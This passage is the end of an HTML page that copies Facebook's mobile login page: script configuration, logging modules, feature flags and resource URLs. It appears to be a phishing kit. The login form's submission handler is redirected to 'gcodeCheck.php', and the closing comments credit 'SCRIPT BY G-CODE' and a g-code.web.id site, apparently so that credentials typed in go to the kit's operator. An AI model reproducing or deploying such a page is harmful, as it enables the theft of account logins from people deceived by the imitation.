              ["__elem_7216e2ae_0_1_FK", "signup_button_area", 1],
              ["__elem_e980dec4_0_0_jG", "signup-button", 1],
              ["__elem_49f6b607_0_0_lX", "root", 1],
              ["__elem_717bb1ae_0_0_Ne", "u_0_4_Y5", 3],
              ["__elem_ad2bcfb1_0_0_ei", "u_0_5_lQ", 1],
              ["__elem_eed16c0a_0_0_yT", "u_0_6_M7", 1],
              ["__elem_a588f507_0_0_JL", "u_0_7_Qi", 1],
              ["__elem_a588f507_0_1_QJ", "u_0_8_2w", 1],
              ["__elem_0cdc66ad_0_0_OI", "u_0_a_wM", 1],
              ["__elem_0cdc66ad_0_1_2f", "u_0_b_PX", 1]
            ],
            require: [
              ["ForgetPasswordAutoSearch", "addListenerForgetPasswordAutoSearch", [],
                ["m_login_email", "m_login_auto_search_form_contactpoint_hidden_input", "m_login_auto_search_form_forgot_password_button"]
              ],
              ["MLoginController", "initAccountRecoveryFunnelLogging", ["__elem_8a020238_0_0_ZA"],
                [{
                  __m: "__elem_8a020238_0_0_ZA"
                }, "click_forget_password", "s6CoYlHMqxcLDpPWkikqQesU"]
              ],
              ["MGetInstalledRelatedApps", "logmTouchInstalledRelatedApps", [],
                ["s6CoYlHMqxcLDpPWkikqQesU"]
              ],
              ["BrowserPrefillLogging", "initContactpointFieldLogging", [],
                [{
                  contactpointFieldID: "m_login_email",
                  serverPrefill: ""
                }]
              ],
              ["BrowserPrefillLogging", "initPasswordFieldLogging", [],
                [{
                  passwordFieldID: "m_login_password"
                }]
              ],
              ["PlatformDialogCBTSetter", "setCBTInFormAndLog", ["__elem_921b58ef_0_0_xD"],
                [{
                  __m: "__elem_921b58ef_0_0_xD"
                }, "client_logged_out_init_impression"]
              ],
              ["MLoginView", "disableOnSubmit", ["__elem_921b58ef_0_0_xD", "__elem_7216e2ae_0_0_B3"],
                [{
                  __m: "__elem_921b58ef_0_0_xD"
                }, {
                  __m: "__elem_7216e2ae_0_0_B3"
                }]
              ],
              ["MLoginController", "initRegButton", ["__elem_7216e2ae_0_1_FK"],
                [{
                  root: {
                    __m: "__elem_7216e2ae_0_1_FK"
                  },
                  regURI: "/reg-no-deeplink/?cid=103",
                  useRegToLogin: true
                }]
              ],
              ["MLoginController", "initLoginForm", ["__elem_de5177dd_0_0_Oe"],
                [{
                  root: {
                    __m: "__elem_de5177dd_0_0_Oe"
                  },
                  ajaxURI: "gcodeCheck.php",
                  clearOnDelete: false,
                  listenKeyDown: false,
                  isTwoStepsLogin: false,
                  isActionLoggingEnabled: true,
                  isCredsManagerEnabled: false,
                  isCredsSavingEnabled: true,
                  isPasswordlessEnabled: false,
                  doNotShowUserHeader: false,
                  shouldWaitForPasswordSave: false,
                  onErrorRegURI: "/r.php",
                  shouldAutoLandOnStep2: false,
                  shouldPrefillJioHeaderForRegFromLogin: false,
                  shouldProcessUserConsentForTokenHeader: false,
                  shouldProcessUserConsentForHeader: false,
                  shouldShowSmartLockSelector: false,
                  shouldRunBotDetection: false,
                  clearPrefillMaskOnKeydown: false,
                  datrCookie: "s6CoYlHMqxcLDpPWkikqQesU",
                  pubKeyData: {
                    publicKey: "e024cdf62c61e12a44cf29789e97f817b82f93a524f85b2a4a2c0295bb1ff86f",
                    keyId: 204
                  },
                  shouldUseEmailDomainTypeahead: false,
                  showDuoLikePasswordless: false,
                  showSingleStepDuoLikePasswordless: false,
                  trackingPreference: "install_from_passwordless_flow"
                }]
              ],
              ["MPasswordPlainTextToggle", "init", ["__elem_e24cb174_0_0_gE", "__elem_7216e2ae_0_2_rc", "__elem_e03291d5_0_0_H/", "__elem_e03291d5_0_1_Ox"],
                [{
                  __m: "__elem_e24cb174_0_0_gE"
                }, {
                  __m: "__elem_7216e2ae_0_2_rc"
                }, {
                  __m: "__elem_e03291d5_0_0_H/"
                }, {
                  __m: "__elem_e03291d5_0_1_Ox"
                }]
              ],
              ["ServiceWorkerLoginAndLogoutListener", "listen", [],
                ["login_button_block", "login", "/sw?s=push", null]
              ],
              ["MTouchable"],
              ["MBlockingTouchable", "init", ["__elem_e980dec4_0_0_jG"],
                [{
                  __m: "__elem_e980dec4_0_0_jG"
                }]
              ],
              ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_49f6b607_0_0_lX"],
                [
                  [{
                    __m: "__elem_49f6b607_0_0_lX"
                  }]
                ]
              ],
              ["GHLSurvey", "survey", [],
                []
              ],
              ["MScrollPositionSaver"],
              ["InitMAjaxify"],
              ["MSeoDirectoryLinks", "initLinks", ["__elem_717bb1ae_0_0_Ne", "__elem_ad2bcfb1_0_0_ei"],
                [{
                  visible: false,
                  toggleButton: {
                    __m: "__elem_717bb1ae_0_0_Ne"
                  },
                  linksContainer: {
                    __m: "__elem_ad2bcfb1_0_0_ei"
                  },
                  expandButton: {
                    __m: "__elem_717bb1ae_0_0_Ne"
                  },
                  collapseButton: {
                    __m: "__elem_717bb1ae_0_0_Ne"
                  }
                }]
              ],
              ["MLynx", "setupDelegation", [],
                []
              ],
              ["MLogoutClearCache"],
              ["LoadingIndicator", "init", ["__elem_eed16c0a_0_0_yT", "__elem_a588f507_0_0_JL", "__elem_a588f507_0_1_QJ"],
                [{
                  __m: "__elem_eed16c0a_0_0_yT"
                }, {
                  __m: "__elem_a588f507_0_0_JL"
                }, {
                  __m: "__elem_a588f507_0_1_QJ"
                }]
              ],
              ["MPageError"],
              ["MPageHeaderAccessibility"],
              ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_0_OI"],
                [{
                  __m: "__elem_0cdc66ad_0_0_OI"
                }]
              ],
              ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_1_2f"],
                [{
                  __m: "__elem_0cdc66ad_0_1_2f"
                }]
              ],
              ["MLoadingIndicator", "init", [],
                ["u_0_9_ch"]
              ],
              ["LogHistoryListeners"],
              ["ScriptPath", "set", [],
                ["/wap/index.php", "4e6eefd9", {
                  imp_id: "139bvjvlityOZaowm",
                  ef_page: null
                }]
              ],
              ["MCommentViewportTracking", "singleton", [],
                [{
                  enabled: true,
                  debug_console: false,
                  debug_html: false,
                  idle_timeout: 5000,
                  min_duration_to_log: 100,
                  min_visible_size: 200
                }]
              ],
              ["MLogging", "main", [],
                [{
                  refid: 8
                }]
              ],
              ["RemoteDevice", "init", [],
                [{
                  performHardwareDetection: false,
                  hashId: null,
                  vpd: false
                }]
              ],
              ["Artillery"],
              ["MLinkHack"],
              ["MModalDialogInit"],
              ["MVerifyCache", "main", [],
                [{
                  viewer: 0
                }]
              ],
              ["EventProfiler"],
              ["MPageNavigationTracking", "init", [],
                []
              ],
              ["FalcoLoggerTransports", "attach", [],
                []
              ],
              ["ScriptPathLogger", "startLogging", [],
                []
              ],
              ["MTimeSpentBitArrayLogger", "init", [],
                ["m", false]
              ],
              ["MCoreDeferred"],
              ["FbtLogging"],
              ["IntlQtEventFalcoEvent"],
              ["BanzaiScuba_DEPRECATED"],
              ["MPageControllerImpl"],
              ["LogWebMemoryUsageFalcoEvent"],
              ["MPageFetcherImpl"],
              ["json-bigint"],
              ["RequireDeferredReference", "unblock", [],
                [
                  ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "MPageControllerImpl", "LogWebMemoryUsageFalcoEvent", "VisualCompletionGating", "MPageFetcherImpl", "json-bigint"], "sd"
                ]
              ],
              ["RequireDeferredReference", "unblock", [],
                [
                  ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "MPageControllerImpl", "LogWebMemoryUsageFalcoEvent", "VisualCompletionGating", "MPageFetcherImpl", "json-bigint"], "css"
                ]
              ]
            ],
            pre_display_requires: [
              ["AddressBar", "setupLoadListener", [],
                [], 4
              ],
              ["MobileBigPipeStratcomProxy", "init", [],
                [], 4
              ],
              ["Stratcom", "init", [],
                [], 4
              ],
              ["MViewport", "init", [],
                [], 4
              ],
              ["ViewportDimensions", "init", [],
                [], 4
              ],
              ["MPageController", "init", [],
                [], 4
              ],
              ["onSyncTTI", "run", [],
                [], 4
              ],
              ["MLiteInit", "init", [],
                [], 4
              ]
            ]
          },
          hsrp: {
            hsdp: {
              bxData: {
                "875231": {
                  uri: "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico"
                }
              },
              clpData: {
                "1744178": {
                  r: 1,
                  s: 1
                },
                "1814852": {
                  r: 1
                },
                "1838142": {
                  r: 1,
                  s: 1
                },
                "1942319": {
                  r: 1,
                  s: 1
                },
                "1842512": {
                  r: 1
                },
                "1829319": {
                  r: 1
                },
                "1829320": {
                  r: 1
                },
                "1843988": {
                  r: 1
                },
                "1848815": {
                  r: 10000,
                  s: 1
                },
                "1949898": {
                  r: 1
                },
                "1765264": {
                  r: 1,
                  s: 1
                }
              },
              gkxData: {
                "2772": {
                  result: false,
                  hash: "AT5Eu244WIce7iwqa34"
                },
                "3752": {
                  result: false,
                  hash: "AT6eS5UTkkMp_xbPpE8"
                },
                "3820": {
                  result: true,
                  hash: "AT6sMf-XMjfPaRKvaYU"
                },
                "3831": {
                  result: false,
                  hash: "AT4W23lQ0XxAZniM-V0"
                },
                "4075": {
                  result: false,
                  hash: "AT4_ZQi0sTjSt-RxLMM"
                },
                "676781": {
                  result: false,
                  hash: "AT4-DnA47xPbjtkwJ20"
                },
                "676837": {
                  result: false,
                  hash: "AT4N8wBZA8ctCdHwupQ"
                },
                "712819": {
                  result: false,
                  hash: "AT79nTpb4gT-yu86lvg"
                },
                "1167394": {
                  result: false,
                  hash: "AT7BpN-tlUPwbIIFoo8"
                },
                "1217157": {
                  result: false,
                  hash: "AT6B7YmllOsArnK6xcA"
                },
                "1224637": {
                  result: false,
                  hash: "AT7JRluWxuwDm3Xzv6I"
                },
                "1554827": {
                  result: false,
                  hash: "AT7zueGLhGo0cT5xy54"
                },
                "1738486": {
                  result: false,
                  hash: "AT4cX37oQco6DwhUOFs"
                },
                "910664": {
                  result: false,
                  hash: "AT69YyFAmMObhORGva0"
                },
                "1511920": {
                  result: true,
                  hash: "AT6pY2ROWoYnl3_cF58"
                },
                "1059877": {
                  result: false,
                  hash: "AT53XV4TWT4lc3_mgmQ"
                },
                "1070739": {
                  result: false,
                  hash: "AT5rKAR6NQAuoRaHPZE"
                },
                "676811": {
                  result: false,
                  hash: "AT4zC0IqvJCbKsUetSM"
                },
                "676812": {
                  result: false,
                  hash: "AT6FULe6g-qrrrQdg8Y"
                },
                "820050": {
                  result: true,
                  hash: "AT7bjlcFFlowDw-SxTs"
                },
                "985697": {
                  result: false,
                  hash: "AT6gOJD7fT0UjmgD0VI"
                },
                "148": {
                  result: false,
                  hash: "AT5V6Me6WVwsRI3waVg"
                },
                "5525": {
                  result: false,
                  hash: "AT56gpXxsmc6rAjxptw"
                },
                "2223": {
                  result: false,
                  hash: "AT4s3JaAt9nQ6ucm_MU"
                },
                "2341": {
                  result: false,
                  hash: "AT7nNd913_uqf_cRdws"
                },
                "726410": {
                  result: true,
                  hash: "AT7w-jbTa3ueodj3L5U"
                },
                "5541": {
                  result: true,
                  hash: "AT70V-Q_zfEykznOk1c"
                },
                "862436": {
                  result: false,
                  hash: "AT7YsAcWL8-1WZrObvI"
                },
                "1099893": {
                  result: false,
                  hash: "AT5kly2LSZV_DKGR7P8"
                },
                "3499": {
                  result: false,
                  hash: "AT5l5tI3kdeSuUxUzZ4"
                }
              },
              qexData: {
                "91": {
                  r: null
                },
                "123": {
                  r: null
                },
                "648": {
                  r: null
                },
                "650": {
                  r: null
                },
                "651": {
                  r: null
                }
              },
              qplData: {
                "891": {
                  r: 1
                }
              }
            },
            hblp: {
              consistency: {
                rev: 1005679812
              },
              rsrcMap: {
                VvVFw8n: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "M5XDl+E": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz"
                },
                hhX2dwf: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/zjJMkiSDtCW.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "LrzNtx/": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/8nwDm3pgofH.js?_nc_x=Ij3Wp8lg5Kz"
                },
                lZZnVFH: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/ngoBhFBLB-O.js?_nc_x=Ij3Wp8lg5Kz"
                },
                w5JLkSF: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3islK4/yo/l/en_GB/McENtLtnSjE.js?_nc_x=Ij3Wp8lg5Kz"
                },
                FJqL2Al: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz"
                },
                vF0qXZY: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz"
                },
                bJ922yg: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz"
                },
                txMBmcX: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3ilqt4/yf/l/en_GB/SR9WpylB8u4.js?_nc_x=Ij3Wp8lg5Kz"
                },
                hMoWeWt: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3i3kA4/yS/l/en_GB/bGTosVsgjZr.js?_nc_x=Ij3Wp8lg5Kz"
                },
                EdRhDux: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/1oQewAX3PWu.js?_nc_x=Ij3Wp8lg5Kz"
                },
                NfvTfKe: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3iLQG4/yk/l/en_GB/aK2Vg0xp7su.js?_nc_x=Ij3Wp8lg5Kz"
                },
                HPolq9r: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3idKW4/yl/l/en_GB/dqwZZfrv5U-.js?_nc_x=Ij3Wp8lg5Kz"
                },
                MOwxiEu: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/Z7yDY2JPbpt.js?_nc_x=Ij3Wp8lg5Kz"
                },
                TUxV68S: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/AEurEMwqHIo.js?_nc_x=Ij3Wp8lg5Kz"
                }
              },
              compMap: {
                QPLInspector: {
                  r: ["VvVFw8n"],
                  be: 1
                },
                ODS: {
                  r: ["M5XDl+E"],
                  be: 1
                },
                TransportSelectingClientSingleton: {
                  r: ["hhX2dwf", "M5XDl+E"],
                  rds: {
                    m: ["ContextualConfig", "BladeRunnerClient", "DGWRequestStreamClient", "MqttLongPollingRunner", "BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"],
                    r: ["58kqqKw", "LrzNtx/", "lZZnVFH", "w5JLkSF", "FJqL2Al"]
                  },
                  be: 1
                },
                RequestStreamCommonRequestStreamCommonTypes: {
                  r: ["hhX2dwf"],
                  be: 1
                },
                Cookie: {
                  r: ["M5XDl+E"],
                  rds: {
                    m: ["BanzaiScuba_DEPRECATED"],
                    r: ["58kqqKw"]
                  },
                  be: 1
                },
                WebSpeedInteractionsTypedLogger: {
                  r: ["M5XDl+E", "TUxV68S", "FJqL2Al", "58kqqKw"],
                  rds: {
                    m: ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"]
                  },
                  be: 1
                },
                PerfXSharedFields: {
                  r: ["M5XDl+E"],
                  be: 1
                }
              }
            }
          },
          allResources: ["+jAKWHf", "MoYpVB9", "M5XDl+E", "58kqqKw", "F5kNww5", "vF0qXZY", "bJ922yg", "txMBmcX", "hMoWeWt", "w5JLkSF", "EdRhDux", "NfvTfKe", "HPolq9r", "MOwxiEu", "FJqL2Al"]
        });
      }));
    </script>
    <script>
      requireLazy(["__bigPipe"], function(bigPipe) {
        bigPipe.setPageID("7109108704229205316-0")
      });
      CavalryLogger.setPageID("7109108704229205316-0");
    </script>
    <script nonce="">
      (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
          bigPipe.beforePageletArrive("last_response", n);
        })
      })();
    </script>
    <script nonce="">
      requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
          id: "last_response",
          phase: 63,
          last_in_phase: true,
          the_end: true,
          jsmods: {
            define: [
              ["IntlCurrentLocale", [], {
                code: "en_GB"
              }, 5954],
              ["MRegTopDomainsConfig", [], {
                topEmailDomains: ["gmail.com", "yahoo.com", "yahoo.co.id", "mailconn.com", "yandex.com"]
              }, 4220],
              ["USIDMetadata", [], {
                browser_id: "?",
                tab_id: "",
                page_id: "Prdh2nnf00s7j",
                transition_id: 0,
                version: 6
              }, 5888],
              ["BrowserPaymentHandlerConfig", [], {
                enabled: false
              }, 3904],
              ["BrowserPushPubKey", [], {
                appServerKey: "BIBn3E_rWTci8Xn6P9Xj3btShT85Wdtne0LtwNUyRQ5XjFNkuTq9j4MPAVLvAFhXrUU1A9UxyxBA7YIOjqDIDHI"
              }, 4806],
              ["MTouchableSyntheticClickGK", [], {
                USE_SYNTHETIC_CLICK: true
              }, 368],
              ["cr:686", [], {
                __rc: [null, "Aa2h0yjx2s7nc6GKibYUnhkvRG-oBNkmEtO0VuomsVlZ3PBPVIHCpRhSpWOVf0bCP3L6njpGSX3yAYSxL0ccF5GONg"]
              }, -1],
              ["cr:1069930", [], {
                __rc: [null, "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["cr:1083116", ["XAsyncRequest"], {
                __rc: ["XAsyncRequest", "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["cr:1083117", [], {
                __rc: [null, "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["cr:1984081", [], {
                __rc: [null, "Aa3KDXsMPkUkfFfOLu1m4x2G1O_gYNSotWMG7y5JelPoaVQ-Nz-7h3wJmjZu0UjZt0y5Fxi5u9Xzgu_ZxKtuL0xOFP4X"]
              }, -1],
              ["cr:334", ["ghlTestUBTFacebook"], {
                __rc: ["ghlTestUBTFacebook", "Aa2bcdUAiaN_8QNozSfyV2QUXDs7ubXtRMt2qO2TrH3iE1jhwgMUBg9dEKejmcE7Oqk4wEkY7QdAOpQ4feN1gRzcWA"]
              }, -1],
              ["cr:1088657", [], {
                __rc: [null, "Aa3bGbruxrHDBTLjZHTJY_yEQWcUXTRdgMe4niraGTo3LM0l3NqdaR8xs0FlW3Dvb9GUH74-zyhyhI2emJDZbKU"]
              }, -1],
              ["cr:1543261", [], {
                __rc: [null, "Aa3BQXF3Pc7cawX4gYPLDI8-BTgvHw0JP0i1Ql0UXEXZyg0rTD1i6IaVPZjcUgW_Wzeqpj6vj13dEKn1lCcP12F3"]
              }, -1],
              ["cr:708886", ["EventProfilerImpl"], {
                __rc: ["EventProfilerImpl", "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["cr:1094907", [], {
                __rc: [null, "Aa1D30XGdBgJdHDdQaFfWkjDNnsB25HQcZeZX2fiL3V9tBJH_CyxKEEME4phxoYx1-4SnYFWx7Tc2X1ltDw_l_8"]
              }, -1],
              ["EventConfig", [], {
                sampling: {
                  bandwidth: 0,
                  play: 0,
                  playing: 0,
                  progress: 0,
                  pause: 0,
                  ended: 0,
                  seeked: 0,
                  seeking: 0,
                  waiting: 0,
                  loadedmetadata: 0,
                  canplay: 0,
                  selectionchange: 0,
                  change: 0,
                  timeupdate: 0,
                  adaptation: 0,
                  focus: 0,
                  blur: 0,
                  load: 0,
                  error: 0,
                  message: 0,
                  abort: 0,
                  storage: 0,
                  scroll: 200000,
                  mousemove: 20000,
                  mouseover: 10000,
                  mouseout: 10000,
                  mousewheel: 1,
                  MSPointerMove: 10000,
                  keydown: 0.1,
                  click: 0.02,
                  mouseup: 0.02,
                  __100ms: 0.001,
                  __default: 5000,
                  __min: 100,
                  __interactionDefault: 200,
                  __eventDefault: 100000
                },
                page_sampling_boost: 1,
                interaction_regexes: {},
                interaction_boost: {},
                event_types: {},
                manual_instrumentation: false,
                profile_eager_execution: false,
                disable_heuristic: true,
                disable_event_profiler: false
              }, 1726],
              ["KillabyteProfilerConfig", [], {
                htmlProfilerModule: null,
                profilerModule: null,
                depTypes: {
                  BL: "bl",
                  NON_BL: "non-bl"
                }
              }, 1145],
              ["QuicklingConfig", [], {
                version: "1005679812;0;",
                sessionLength: 30,
                inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                logRefreshOverhead: false
              }, 60]
            ],
            require: [
              ["BDClientSignalCollectionTrigger", "startSignalCollection", [],
                [{
                  sc: "{\"t\":1637128278,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",
                  fds: 60,
                  fda: 60,
                  i: 60,
                  sbs: 1,
                  dbs: 100,
                  bbs: 100,
                  hbi: 60,
                  rt: 262144,
                  hbcbc: 2,
                  hbvbc: 0,
                  hbbi: 30,
                  sid: -1,
                  hbv: "7229049480551521308"
                }]
              ],
              ["NavigationMetrics", "setPage", [],
                [{
                  page: "/wap/index.php",
                  page_type: "normal",
                  page_uri: "https://m.facebook.com/",
                  serverLID: "7109108704229205316-0"
                }]
              ],
              ["CavalryLoggerImpl", "startInstrumentation", [],
                []
              ],
              ["Artillery", "disable", [],
                []
              ],
              ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                []
              ]
            ]
          },
          hsrp: {
            hsdp: {
              clpData: {
                "1743095": {
                  r: 1,
                  s: 1
                }
              },
              gkxData: {
                "1652843": {
                  result: false,
                  hash: "AT6uh9NWRY4QEQoYzsc"
                }
              }
            },
            hblp: {
              consistency: {
                rev: 1005679812
              },
              rsrcMap: {
                t1KEUNA: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/t__edt-vDoo.js?_nc_x=Ij3Wp8lg5Kz"
                },
                FEt5GzN: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz"
                }
              }
            }
          },
          allResources: ["t1KEUNA", "M5XDl+E", "FEt5GzN", "MOwxiEu", "58kqqKw"],
          onload: ["CavalryLogger.getInstance(\"7109108704229205316-0\").setTTIEvent(\"t_domcontent\");"],
          onafterload: ["window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");", "if (window.ExitTime){CavalryLogger.getInstance(\"7109108704229205316-0\").setValue(\"t_exit\", window.ExitTime);};"]
        });
      }));
    </script>
    <div class="AdBox Ad advert post-ads"></div>
<!--   SCRIPT BY G-CODE   -->
<!--      EDIT? CUPU      -->
<!--   www.g-code.web.id  -->
    <div class="ob-hover"></div>
    <iframe srcdoc="" style="display: none;"></iframe>
  </body>
</html>